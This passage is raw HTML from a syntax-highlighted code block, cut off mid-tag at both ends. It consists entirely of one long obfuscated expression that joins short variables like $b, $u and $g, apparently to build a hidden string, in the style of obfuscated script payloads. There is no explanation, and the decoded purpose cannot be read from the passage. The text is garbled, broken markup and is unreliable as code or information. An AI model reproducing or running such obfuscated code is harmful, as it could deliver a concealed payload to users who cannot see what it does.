class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$x</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span><span class="hljs-variable">$q</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span 